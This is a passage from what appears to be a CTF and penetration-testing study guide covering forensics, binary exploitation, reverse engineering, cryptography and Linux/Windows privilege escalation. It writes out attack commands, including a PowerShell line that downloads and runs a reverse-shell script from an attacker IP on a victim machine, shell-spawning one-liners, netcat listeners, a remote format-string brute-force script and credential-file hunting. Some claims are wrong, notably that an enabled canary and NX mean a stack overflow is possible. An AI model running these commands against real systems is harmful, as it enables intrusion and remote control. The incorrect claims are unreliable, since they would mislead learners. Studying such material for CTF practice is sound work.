* Even things like a basic screenshot or the user's clipboard 

A tool used for analyzing memory dumps is [volatility 3](https://github.com/volatilityfoundation/volatility3).

### Volatility 3
Volatility 3 is a memory forensics framework that allows you to analyze memory dumps.

**Useful commands:**
* `vol.py -f <memory dump> imageinfo` - Get information about the memory dump
* `vol.py -f <file> windows.filescan.FileScan` - List all files in the memory dump
* `vol.py -f <file> windows.pslist.PsList` - List all processes in the memory dump
* `vol.py -f <file> windows.dumpfiles.DumpFiles --virtaddr <address>` - Dump a file from the memory dump
  * `--pid PID` Process ID to include (all other processes are excluded)
  * `--virtaddr VIRTADDR`  Dump a single _FILE_OBJECT at this virtual address
  * `--physaddr PHYSADDR`  Dump a single _FILE_OBJECT at this physical address

Remember to append the `--output-dir <directory>` flag to save the output to a directory. Or simply redirect the output to a file with `> <filename>`. I've written more about Volatility 3 [here](/More/Memory%20Forensics/Readme.md).

## Disk imaging
Create exact copies of storage devices for forensic analysis without altering original evidence.

**Common Tools:**
```bash
# dd - basic disk imaging
dd if=/dev/sda of=disk_image.raw bs=4M status=progress

# dcfldd - enhanced dd with hashing
dcfldd if=/dev/sda of=disk_image.raw hash=sha256 hashwindow=1G

# ewfacquire - create E01 format
ewfacquire /dev/sda
```

**FTK Imager (Windows/GUI):**
- Free forensic imaging tool by AccessData
- **Usage**: File → Create Disk Image → Select source → Choose format (E01/Raw) → Set destination
- **Features**: Built-in verification, compression options, case information metadata
- **Advantage**: User-friendly interface, widely accepted in court
- **Download**: Available from AccessData website

**Image Formats:**
- **Raw/DD**: Bit-for-bit copy, largest file size
- **E01/EWF**: EnCase format, includes metadata and compression
- **AFF**: Advanced Forensic Format, open source alternative

**Best Practices:**
- Use write blockers to prevent modification
- Calculate hash values for integrity verification
- Document chain of custody
- Work with copies, never original evidence

### Sleuthkit
The Sleuth Kit is a collection of command-line tools for analyzing disk images and recovering data. It is used by digital forensics professionals and law enforcement agencies to investigate computer crimes.

Examples of tools in The Sleuth Kit:
```bash
mmls disk.flag.img # see partitions
fsstat -o 2048 disk.flag.img # determine file system
fls -o 2048 dds2-alpine.flag.img # list files
fls -o 2048 dds2-alpine.flag.img 18290 # list files in a directory
icat -o 2048 dds2-alpine.flag.img 18291 # extract a file
fls -i raw -f ext4 -o 360448 -r disk.flag.img | grep flag # search for files with flag in the name
icat -i raw -f ext4 -o 360448 -r disk.flag.img 2371 # extract a file by inode

-i is the image type, 
-f is the file system type
-r is to recursively display directories
```

# Binary Exploitation
Binary exploitation involves finding and exploiting vulnerabilities in compiled programs. This requires understanding low-level system concepts like memory management, assembly language, and CPU architecture.

Prerequisites:
- Basic understanding of C/C++ programming
- Assembly language fundamentals  
- Memory layout concepts (stack, heap, segments)
- Operating system concepts (processes, memory protection)

Essential Tools: GDB, radare2, Ghidra, pwntools, ROPgadget

Practice Safely: Use dedicated platforms like picoCTF, pwnable.tw, or local VMs. Never test on systems you don't own.

## Registers
CPU registers are high-speed storage locations within the processor. In x86-64 architecture, understanding registers is crucial for binary exploitation.

**Register Naming Convention:**
- 64-bit: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP
- 32-bit: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP  
- 16-bit: AX, BX, CX, DX, SI, DI, BP, SP
- 8-bit: AL/AH, BL/BH, CL/CH, DL/DH

**General Purpose Registers:**

| 64-bit | 32-bit | 16-bit | 8-bit | Purpose |
|--------|--------|--------|-------|---------|
| RAX | EAX | AX | AL | Accumulator (return values, arithmetic) |
| RBX | EBX | BX | BL | Base register (pointer to data) |
| RCX | ECX | CX | CL | Counter (loop operations) |
| RDX | EDX | DX | DL | Data register (I/O operations) |
| RSI | ESI | SI | SIL | Source index (string operations) |
| RDI | EDI | DI | DIL | Destination index (string operations) |
| RBP | EBP | BP | - | Base pointer (stack frame) |
| RSP | ESP | SP | - | Stack pointer (top of stack) |
| R8-R15 | R8D-R15D | R8W-R15W | R8B-R15B | Additional 64-bit registers |

**Special Registers:**
- **RIP/EIP/IP**: Instruction pointer (current instruction)
- **RFLAGS/EFLAGS/FLAGS**: Status flags

**Example Usage:**
```assembly
mov rax, 0x1234567890abcdef  ; 64-bit
mov eax, 0x12345678          ; 32-bit (clears upper 32 bits)
mov ax, 0x1234               ; 16-bit
mov al, 0x12                 ; 8-bit low
mov ah, 0x34                 ; 8-bit high
```
## The Stack
The stack is a Last-In-First-Out (LIFO) data structure used for function calls, local variables, and return addresses.

**Stack Operations:**
- PUSH: Add data to top of stack (decreases RSP)
- POP: Remove data from top of stack (increases RSP)

**Stack Frame Structure:**
```
High Memory
+-----------------+
| Function Args   |
+-----------------+
| Return Address  | <- Overwrite this for control
+-----------------+
| Saved RBP       |
+-----------------+ <- RBP points here
| Local Variables |
+-----------------+ <- RSP points here
Low Memory
```

**Stack in Function Calls:**
1. Arguments pushed onto stack
2. CALL instruction pushes return address
3. Function prologue saves old RBP
4. Local variables allocated
5. Function epilogue restores RBP
6. RET instruction returns to saved address

**Security Implications:**
- Buffer overflows can overwrite return addresses
- Stack canaries detect corruption
- NX bit prevents stack execution

### Stack Overflow
To see if a stack overflow is possible, run the following command:
```bash
checksec --file=<executable>
```
If the output contains `Canary found` and `NX enabled`, then a stack overflow is possible. See more about this command [here](/More/Binary%20Exploitation/Checksec.md).
### Stack Shellcode
Inject and execute shellcode on the stack when NX protection is disabled.

**Simple Steps:**
1. Fill buffer with your shellcode (machine code)
2. Overflow to overwrite return address  
3. Make return address point to your shellcode
4. When function ends, it runs your code

**Memory Layout:**
```
[YOUR_SHELLCODE + PADDING][ADDRESS_TO_SHELLCODE]
                           ↑
                    This overwrites return address
```

**What shellcode does:**
- Opens a shell (/bin/sh)
- Connects back to your computer
- Runs any command you want

**Why it works:**
- Old programs let stack execute code
- Modern programs usually block this (NX protection)
### Return to Win (Ret2Win)
Jump to a function that's already in the program instead of writing your own code.

**The Idea:**
- Program has a "win" function that gives you a flag/shell
- You just need to call that function
- Much easier than writing shellcode

**How it works:**
1. Find the "win" function address (like 0x401234)
2. Overflow the buffer
3. Replace return address with win function address
4. Program jumps to win function and you get the flag

**Memory Layout:**
```
[JUNK_DATA][WIN_FUNCTION_ADDRESS]
            ↑
    Program jumps here instead of normal return
```

**Why it's easier:**
- No need to write machine code
- Just redirect to existing code
- Works even with some protections
## Calling Conventions
How programs pass information to functions. Like rules for a conversation.

**Linux 64-bit (most common):**
- First argument goes in RDI register
- Second argument goes in RSI register  
- Third in RDX, fourth in RCX, etc.
- Function returns answer in RAX

**Example - calling system("/bin/sh"):**
```assembly
mov rdi, "/bin/sh"    # Put "/bin/sh" in first argument
call system           # Call function
```

**Why this matters for exploits:**
- To call functions, you need to put arguments in right places
- If you want system("/bin/sh"), you need "/bin/sh" in RDI first
- Different operating systems have different rules

**32-bit is different:**
- All arguments go on the stack (no registers)
- Simpler but less efficient
## Global Offset Table (GOT)
A phone book that programs use to find function addresses. Table that stores addresses of external functions for dynamic linking.

**Purpose:**
- Resolve function addresses at runtime
- Enable position-independent code
- Support shared libraries

**What it does:**
- Programs don't know where printf() or other functions live in memory
- GOT stores the actual addresses of these functions
- When program calls printf(), it looks up the address in GOT first

**GOT vs PLT:**
- **GOT**: Contains actual function addresses
- **PLT**: Contains jump stubs to GOT entries

**GOT Overwrite Attack:**
1. Find GOT entry for target function
2. Overwrite with address of controlled function
3. When target function called, redirects to attacker code

**Simple Example:**
1. Program calls printf("Hello")
2. Program looks in GOT: "printf is at address 0x123456"
3. You change GOT: "printf is at address 0x789abc" (where system() lives)
4. Program calls system("Hello") instead of printf("Hello")

**Finding GOT entries:**
```bash
# Find GOT entries
objdump -R binary
readelf -r binary

# In GDB, examine GOT
x/gx 0x404018  # GOT entry address
```

**Common Targets:**
- printf → system
- exit → main (for infinite loop)
- malloc → system

**Why this works:**
- Program trusts its own phone book (GOT)
- If you can write to GOT, you control function calls
- Great for when you can't directly control execution flow
## Buffers
### Buffer Overflow
Buffer overflow is a type of security vulnerability that occurs when a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. This can cause the program to crash or, in the case of a remote attacker, to execute arbitrary code on the system.

**Quick note:**
* If some C code contains the function `gets()` or `strcpy()`, it is vulnerable to a buffer overflow attack.
* An important part of the memory we can overwrite is the instruction pointer (IP/return address), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in a binary to point to a different location, we can execute arbitrary code.
* The top of the stack is pointed to by the SP (or stack pointer) which is called esp in 32-bit machines.

### Buffer Overflow Exploitation example
A very simple example of a buffer overflow exploit looks like the following:
```bash
python -c "print ('A' * 100)" | ./<executable>
```

### Variable Overwrite
Change nearby variables by overflowing a buffer. Easier than full exploitation.

**The Setup:**
```c
char password[10];
int is_admin = 0;        // This is next to password in memory

gets(password);          // Dangerous! No size check
if (is_admin) {
    printf("You're admin!\n");
}
```

**The Attack:**
- Type more than 10 characters
- Extra characters overflow into is_admin variable
- is_admin becomes non-zero (true)
- You get admin access

**Memory Layout:**
```
[password buffer][is_admin]
[AAAAAAAAAA]     [0]        ← Normal
[AAAAAAAAAAAA]   [AA]       ← Overflow! is_admin now = AA (non-zero)
```

**Why it works:**
- Variables stored next to each other in memory
- No boundary checking on input
- Simpler than controlling execution flow
## Return Oriented Programming (ROP)
Return Oriented Programming (ROP) works by chaining together small pieces of code, called "gadgets," that are already present in the target program's memory space to perform a series of operations that the attacker desires. Each gadget typically ends with a "return" instruction that tells the program where to continue executing code after the gadget has finished. 

By carefully selecting and chaining together gadgets that end with a return instruction, attackers can construct a "ROP chain" that allows them to execute their own code on the target system. This technique can be used to bypass security measures such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).
## Binary Security
A tool that can detect binary security security mechanisms is `checksec`. I've written about the tool [here](/More/Binary%20Exploitation/Checksec/Readme.md).

### No eXecute (NX)
NX is a hardware security feature that prevents execution of code from non-executable memory regions. This helps to prevent certain types of attacks, such as buffer overflow exploits, which attempt to execute malicious code by overwriting the memory. Also means no shellcode can be executed from the stack.

### Position Independent Executable (PIE)
PIE is a security feature that randomizes the base address of the program's code and data sections at runtime. This makes it more difficult for an attacker to predict the memory address of a vulnerable function or piece of data, and thus makes it harder to exploit certain types of vulnerabilities.

### Address Space Layout Randomization (ASLR)
ASLR  is a security technique that randomizes the memory layout of a process at runtime. This makes it more difficult for an attacker to predict the memory address of a vulnerable function or piece of data, and thus makes it harder to exploit certain types of vulnerabilities.

### Stack Canaries
Stack Canaries is a security mechanism that detects buffer overflow attacks. It works by placing a small value, known as a "canary," on the stack before the return address. If a buffer overflow occurs, the canary value will be overwritten, and the program will detect the modification and terminate the execution.

### Relocation Read-Only (RELRO)
RELRO is a security feature that makes certain sections of the program read-only after the dynamic linker has resolved all symbols. This prevents an attacker from overwriting important data or functions in memory, and can help to prevent certain types of attacks, such as the Global Offset Table (GOT) overwrite.
## The Heap
### Heap Exploitation
Attack memory that programs allocate dynamically (with malloc).

**What's the heap?**
- Area where programs store data that can grow/shrink
- Unlike stack (fixed size), heap is flexible
- Programs use malloc() to get memory, free() to return it

**Common Mistakes Programs Make:**
- **Use after free**: Use memory after giving it back
- **Double free**: Return the same memory twice  
- **Heap overflow**: Write past the end of allocated space
- **Heap spray**: Fill heap with controlled data

**Simple Example:**
```c
char *data = malloc(10);     // Get 10 bytes
strcpy(data, "This is way too long!");  // Write 20+ bytes!
free(data);                  // Return memory
strcpy(data, "hello");       // Use after free - CRASH!
```

**Why it's hard:**
- Heap layout is complex and changes
- Requires understanding memory management
- Usually need multiple bugs to exploit
## Format String Vulnerability
A format string vulnerability is a type of software vulnerability that occurs when a program uses user input to construct a format string for the `printf` or `scanf` functions without properly validating or sanitizing the input. This can allow an attacker to execute arbitrary code or read sensitive data from the program's memory. Read more about the functions [here](/More/Assembly/Common-C-functions.md).

The format specifiers are the following:

| Format Specifier | Description |
|---|---|
| %c | Character |
| %d | Signed decimal integer |
| %e | Scientific notation |
| %f | Decimal floating point |
| %g | Use the shortest representation: %e or %f |
| %i | Signed decimal integer |
| %o | Unsigned octal |
| %s | String of characters |
| %u | Unsigned decimal integer |
| %x | Unsigned hexadecimal integer |
| %X | Unsigned hexadecimal integer (uppercase) |

### Format String Vulnerability Exploitation example
A simple example of a format string vulnerability is the following:
```bash
python -c "print ('%x ' * 100)" | ./<executable> # Local
python -c "print ('%x ' * 100)" | nc <host> <port> # Remote
```

Its also possible to brute force the stack for values. 
```python
from pwn import *

for i in range(1, 50):
    r = remote('<host>', <port>)
    r.sendline('%' + str(i) + '$s')
    print('%' + str(i) + '$s')
    print(r.recv())
```
## Integer Overflow
Integer overflow is a type of software vulnerability that occurs when an integer value is incremented beyond its maximum value, causing it to "wrap around" to a negative value. This can lead to unexpected behavior in the program, such as crashes or security vulnerabilities.

### Data types
**BYTE** = 8 bits  
**WORD** = 16 bits  
**DWORD** = Double Word (32 bits)  
**QWORD** = Quad Word (64 bits)
## ASLR Bypass
### Return to PLT (Ret2plt)
Bypass ASLR by calling functions through the Procedure Linkage Table.

**Concept:**
- PLT entries have fixed addresses
- Can call system functions via PLT
- Useful when ASLR randomizes library addresses

**Common Technique:**
1. Find PLT entry for desired function
2. Set up arguments in registers/stack
3. Return to PLT entry

**Example:**
```python
# Call system("/bin/sh") via PLT
rop = ROP(binary)
rop.system(next(binary.search(b"/bin/sh")))
```

**PLT vs Direct Call:**
- PLT: Fixed address, works with ASLR
- Direct: Randomized address, fails with ASLR
# Reverse Engineering
Reverse-engineering is the creative process of analyzing software and understanding it without having access to the source code. It is the process by which software is deconstructed in a way that reveals its innermost details such as its structure, function and operation.

## Assembly Language
Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly/Introduction.md).

Assembly is the low-level programming language that directly corresponds to machine code instructions.

**Common Instructions:**
- **MOV**: Move data between locations
- **ADD/SUB**: Arithmetic operations  
- **CMP**: Compare values
- **JMP/JE/JNE**: Jump instructions
- **CALL/RET**: Function calls
- **PUSH/POP**: Stack operations

**Intel vs AT&T Syntax:**
```assembly
# Intel syntax
mov eax, 5
add eax, ebx

# AT&T syntax  
movl $5, %eax
addl %ebx, %eax
```

**Useful for:**
- Reverse engineering binaries
- Understanding exploits
- Optimizing performance-critical code
## Disassemblers & Debuggers
A disassembler is a computer program that translates machine language into assembly language—the inverse operation to that of an assembler. A debugger is a computer program that is used to test and debug other programs.

### ltrace & strace
`strace` is a debugging utility in Linux used to monitor the system calls used by a program and all the signals it receives.

`ltrace` is a debugging utility in Linux used to display the calls a user space application makes to shared libraries. It traces the library calls made by a process and the signals received by the process.

### gdb
GDB, the GNU Project debugger, allows you to see what is going on `inside' another program while it executes -- or what another program was doing at the moment it crashed.

```console
berkankutuk@kali:~$ gdb <binary file> # opens the binary file in gdb

(gdb)> set disassembly-flavor intel # sets the disassembly flavor to intel

(gdb)> break <function_name> # sets a breakpoint at the given function
(gdb)> break *<addr> # sets a breakpoint at the given address
(gdb)> si # steps through the program one instruction at a time
(gdb)> ni # steps over the current instruction
(gdb)> run # runs the program until it reaches the first breakpoint
(gdb)> run <input file> # runs the program with the given input file
(gdb)> disassemble <function_name> | main # disassembles the given function
(gdb)> x/s <addr> # prints a string from memory address
(gdb)> continue # continues the execution of the program
(gdb)> info registers # prints the values of the registers
(gdb)> info variables # prints the values of the variables
(gdb)> info functions # prints the functions
(gdb)> set $eax=0 # sets the value of the eax register to 0
(gdb)> exploit # runs the exploit
(gdb)> x # inspect memory locations
(gdb)> quit # quits gdb
```

### radare2
Radare2 is an open-source framework that can perform disassembly, debugging, analysis, comparing data and manipulation of binary files. 

```console
berkankutuk@kali:~$ r2 <binary file>` # opens the binary file in radare2
berkankutuk@kali:~$ r2 -d <binary file>` # opens the binary file in radare2 in debug mode 

# General
[0x00400510]> aaa # Analyze the binary
[0x00400510]> afl # List functions
[0x00400510]> s main # Go to main function
[0x00400510]> pdf # Print disassembled function
[0x00400510]> s/ password # Search for data within the code
[0x00400510]> V # Hex view
[0x00400510]> VV # Visual mode

# Debug mode
[0x00400510]> db <addr> # Set breakpoint at address
[0x00400510]> dc # Continue execution
[0x00400510]> dr # Show registers
[0x00400510]> s # step instruction
```

### Ghidra
Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency (NSA). It is a free and open-source software reverse engineering tool released under the Apache License 2.0.

```bash
berkankutuk@kali:~$ ghidraRun <binary file>` # opens the binary file in ghidra
```

Ghidra GUI
```bash
Right click -> Patch Instruction -> Values # Patch the instruction with the given values 
File -> Export Program -> Export as ELF # Export the binary as an ELF file

Symbol Tree -> Functions # List functions (ex. Main)
```

## Call Graphs
[Cytoscape](https://github.com/cytoscape/cytoscape) is a tool for network analysis and visualization that can be used to see call graphs.

**Useful functions:**
- Layout -> Grid View = Show a grid view of the nodes.
- Pathlinker = Find paths between nodes. Needs a source and a target node. K = number of paths to find. Is mostly one in CTF situations.

## Decompilers
A decompiler is a computer program that takes an executable file as input, and attempts to create a high level code (like C/C++, Java). 

### Jar files
A jar file is a Java archive file that can contain multiple files and folders. Jar files are mainly used for archiving, compression and decompression. Jar files are similar to zip files, but jar files can have additional attributes that are required for a Java application to run.

To decompile a jar file, [procyon](https://manpages.ubuntu.com/manpages/jammy/man1/procyon.1.html) can be used. For online [DogBolt](https://www.dogbolt.com/) is a good option.

```bash
berkankutuk@kali:~$ sudo apt-get install -y procyon-decompiler
berkankutuk@kali:~$ procyon -jar <jar file> -o <output directory>
```

## .NET Decompilers
* [dotPeek](https://www.jetbrains.com/decompiler/) - Free .NET decompiler and assembly browser
* [ILSpy](https://github.com/icsharpcode/ILSpy) - .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&more) - cross-platform!


# Cryptography
Cryptography is the foundation of modern security, protecting data through mathematical algorithms. Understanding crypto principles is essential for both securing systems and attacking weak implementations.

Learning Path:
1. Basics: Hashing, symmetric vs asymmetric encryption
2. Classical: Caesar, Vigenère, substitution ciphers  
3. Modern: AES, RSA, elliptic curves
4. Applications: TLS/SSL, digital signatures, key exchange
5. Attacks: Weak implementations, side channels, quantum threats

Essential Tools: OpenSSL, hashcat, John the Ripper, CyberChef, cryptographic libraries

Implementation Warning: Never implement crypto from scratch in production. Use established, audited libraries.

## Generating Keys
To generate a private key we use the following command (8912 creates the key 8912 bits long):  
`openssl genrsa -aes256 -out private.key 8912`

To generate a public key we use our previously generated private key:  
`openssl rsa -in private.key -pubout -out public.key`

Lets now encrypt a file (plaintext.txt) using our public key:  
`openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt`

Now, if we use our private key, we can decrypt the file and get the original message:  
`openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt`

## Cryptographic Methods
### Cryptii
[Cryptii](https://cryptii.com) has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigenère Cipher and more.

### Keyboard Shift
[Dcode](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...

### Bit Shift
Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).

[Bit Calculator](https://bit-calculator.com/bit-shift-calculator) is a good tool to calculate bit shifts. For other bit operations, use the [RapidTables](https://www.rapidtables.com/calc/math/binary-calculator.html) tool.

### Reversed Text
Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in Python like so:

"UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT"[::-1]

### XOR
ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in \xde\xad\xbe\xef etc..) Note that you can do easy XOR locally with Python like so (you need pwntools installed):

`python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")`

### Vigenère Cipher
The Vigenère cipher is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It employs a form of polyalphabetic substitution.

The encryption of the original text is done using the Vigenère square or Vigenère table. It is a table of alphabets written out 26 times in different rows, each alphabet shifted cyclically to the left compared to the previous alphabet, corresponding to the 26 possible Caesar ciphers. At different points in the encryption process, the cipher uses a different alphabet from one of the rows. The alphabet used at each point depends on a repeating keyword.

### Caesar Cipher
The Caesar cipher is one of the earliest known and simplest ciphers. It is a type of substitution cipher in which each letter in the plaintext is replaced by a letter some fixed number of positions down the alphabet. For example, with a left shift of 3, D would be replaced by A, E would become B, and so on. The method is named after Julius Caesar, who used it in his private correspondence.

### ROT13
ROT13 is a simple letter substitution cipher that replaces a letter with the letter 13 letters after it in the alphabet. ROT13 is an example of the Caesar cipher which was developed in ancient Rome.

### Substitution Cipher
A substitution cipher is a method of encoding by which units of plaintext are replaced with ciphertext, according to a fixed system; the "units" may be single letters (the most common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The receiver deciphers the text by performing the inverse substitution.

Useful tools for substitution ciphers are [Cryptii](https://cryptii.com) and [Dcode](https://www.dcode.fr/substitution-cipher).
## Encoding
Encoded data can be decoded immediately, without keys. It's NOT a form of encryption, it just a way of representing data.

**A very popular encoding is Base64.**  
The basic idea behind Base64 encoding is to represent binary data using only ASCII characters. To do this, Base64 converts each 3 bytes of binary data into 4 bytes of ASCII text. The 3 bytes of binary data are divided into 4 groups of 6 bits each, which are then represented by a character from a set of 64 characters. The 64 characters used in Base64 are:

`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`

The equals sign (=) is also used as a padding character to ensure that the length of the output is a multiple of 4 characters.

For example, let's say we want to encode the binary data "`011000010110001001100011`", which represents the ASCII characters "`abc`". To encode this data in Base64, we first divide it into 3-byte groups:

`01100001 01100010 01100011`

Then we divide each 3-byte group into 4 groups of 6 bits each:

`011000 010110 001001 100011`

Next, we convert each group of 6 bits to its corresponding Base64 character:

`Y W J j`

So the encoded Base64 string for "`abc`" is "`YWJj`".

### Encoding a string in the terminal
```bash
echo -n "Hello World" | base64
```

### Decoding a string in the terminal
```bash
echo -n "SGVsbG8gV29ybGQ=" | base64 -d
```

### Encoding/Decoding files
```bash
base64 /path/to/file > output.txt # Encoding
base64 -d /path/to/file > output.txt # Decoding
```
## Hashing
Hashing is used for 2 main purposes in Cyber Security. To verify integrity of data, or for verifying passwords. 

plaintext ➡️ hash  
hash ⛔ plaintext

Doing a lookup in a sorted list of hashes that are not salted is quite fast, much much faster than trying to crack the hash. But in case we have to crack, then its done by hashing a large number of different inputs (often rockyou.txt, these are the possible passwords), potentially adding the salt if there is one and comparing it to the target hash. 

Tools like Hashcat and John the Ripper are normally used for this.
## Ciphers
Methods for encrypting and decrypting data to protect confidentiality.

**Classical Ciphers:**
- **Caesar**: Shift letters by fixed amount
- **Vigenère**: Use repeating key for shifting
- **Substitution**: Replace each letter with another
- **Transposition**: Rearrange letter positions

**Modern Ciphers:**
- **AES**: Advanced Encryption Standard (symmetric)
- **RSA**: Rivest-Shamir-Adleman (asymmetric)
- **DES**: Data Encryption Standard (obsolete)

**Examples:**
```bash
# Caesar cipher (shift by 3)
plaintext:  HELLO
ciphertext: KHOOR

# Simple substitution
A->Z, B->Y, C->X, etc.
```

**Breaking Ciphers:**
- Frequency analysis
- Known plaintext attacks
- Brute force (short keys)
- Mathematical weaknesses
## Encryption (RSA)
### Symetric encryption
plaintext ➡️ 🔑 ➡️ ciphertext  
plaintext ⬅️ 🔑 ⬅️ ciphertext  
(🔑 shared key)

### Asymetric encryption
plaintext ➡️ 🔑 ➡️ ciphertext  
plaintext ⬅️ 🗝 ⬅️ ciphertext  
(🔑 public key, 🗝 private key

Public key to encrypt, private key to decrypt.

### Cracking ecrypted files
If you are using Kali linux or Parrot OS, you should have a binary add on called `gpg2john`. This binary program allows us to convert the gpg file into a hash string that john the ripper can understand when it comes to brute-forcing the password against a wordlist. 

How to use it (GPG example):
```bash
gpg2john encrypted_file.txt.gpg > hash.txt
```
Then you can use john the ripper to crack the password.

```bash
john --wordlist=/usr/shared/wordlists/rockyou.txt --format=gpg hash.txt
```

The result should reveal the password if you have used a strong wordlist that contains it.

# Windows Exploitation
## Active directory
Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. 

Other related terms include: Domain controllers, Trusts & Policies, Services, Authentication & Cloud security.

## Windows Reverse Shells
If you have access to PowerShell, you can get a Reverse shell by using [nishang's](https://github.com/samratashok/nishang) Invoke-PowerShellTcp.ps1 script inside of the Shells directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):
```
python -m SimpleHTTPServer
```
and then on the victim machine:
```
powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
```
Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility rlwrap before your netcat listener command.

```
rlwrap nc -lnvp 9001
```

## Samba (SMB)
smbmap tells you permissions and access, which smbclient does not do!

**smbmap**  
To try and list shares as the anonymous user (this doesn't always work for some weird reason)  
`smbmap -H <IP> -u anonymous`

**enum4linux**    
Another enumeration tool is enum4linux which can be used like this:  
`enum4linux <ip>`

**smbclient**  
You can use smbclient to look through files shared with SMB. To list available shares:  
`smbclient -m SMB2 -N -L //10.10.10.125/`

> The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.

For more, see this page: [Samba](More/Windows/Samba.md)

# Shells and Privilege Escalation
## Public Exploits
**Google**   
A simple search: `openssh 7.2 exploit`

**Exploit-DB**  
```bash
berkankutuk@kali:~$ sudo apt install exploitdb -y
berkankutuk@kali:~$ searchsploit openssh 7.2
```

**MetaSploit** 
* Running reconnaissance scripts to enumerate remote hosts and compromised targets
* Verification scripts to test the existence of a vulnerability without actually compromising the target
* Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

Quick exploit search
```bash	
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```
Then to use it
```bash	
msf6 > use exploit/windows/smb/ms17_010_psexec
```

**Other**  
We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/).


## TTY Shell
The tty command of terminal basically prints the file name of the terminal connected to standard input. tty is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system

**Shell Spawning**  
`python -c 'import pty; pty.spawn("/bin/sh")'`  
`echo os.system('/bin/bash')`  
`/bin/sh -i`  
`perl —e 'exec "/bin/sh";'`  
`perl: exec "/bin/sh";`  
`ruby: exec "/bin/sh"`  
`lua: os.execute('/bin/sh')`  
From within IRB  
`exec "/bin/sh"`  
From within vi  
`:!bash`  
From within vi  
`:set shell=/bin/bash:shell`  
From within nmap  
`!sh`  

Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.

### Reverse Shells 
Reverse shells are used to connect back to a listening machine. This is useful when you have a shell on a machine, but you want to connect back to your own machine.

A useful website to generate a reverse shell is [RevShells](https://www.revshells.com/).

Other useful reverse shells can be found in this repo: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

For PHP, you can take a look at this RS from PentestMonkey: [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

### Shell stabilization
Improve basic reverse shells to make them more usable and stable.

**Common Issues with Basic Shells:**
- No tab completion
- No command history
- Can't use Ctrl+C
- Limited text editing

**Python TTY Method:**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background with Ctrl+Z
stty raw -echo; fg
```

**Other Methods:**
```bash
# Script command
script -qc /bin/bash /dev/null

# Socat (if available)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Netcat with rlwrap
rlwrap nc -lvnp 4444
```

**Full Stabilization Process:**
1. Spawn TTY shell
2. Set terminal type
3. Configure stty settings
4. Resize terminal if needed

## Privilege Escalation 
Check for root password
* Run: `id`  
* Run: `sudo -l` to list commands that can be run as root  
* Check `cat /etc/*release` for OS version
* Locate password folder and crack it using johntheripper
* Remember to look for cron jobs or other running tasks. If they require root, use [pspy](https://github.com/DominicBreuker/pspy).
* Or use [GTFOBins](https://gtfobins.github.io) 

You can also run:  
```bash
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```
To download and then execute the script on a target machine to see the files that stand out.

Another option would be to run the following command to find all files with the SUID bit set:   
`find / -perm -u=s -type f 2>/dev/null` fine  
`find / -user root -perm 4000 -print 2>/dev/null` good  
`find / -user root -perm 4000 -exec ls -ldb {} \; 2>/dev/null` better  
`find / -user root -perm 4000 -exec ls -ldb {} \; 2>/dev/null | grep 'bin'` best  

`2>/dev/null` will filter out the errors so that they will not be output to your console

### Find info about the users of the system
Find users on a system  
`cat /etc/passwd | grep “/bin/bash”`

Find passwords  
`cat /etc/passwd`

If you don't have privilege, try this  
`find / -name shadow* 2>/dev/null | head`

I've explained the /etc/passwd format [here](/More/Linux%20Reinforced%20(CLI)/Passwd-file.md), in case you want to know more.

### Privilege Escalation using SUID Binaries
`-rwsr-xr-x`  
“s” = SUID. This means that any user can execute these commands and they will be ran as the original owner.

**Example**  
Lets say the `cat` command had the 's' in its SUID. Then you would be able to use something like the following command to read a flag:  
`find /home/berkan/flag1.txt -exec cat {} \;`

### Persistence
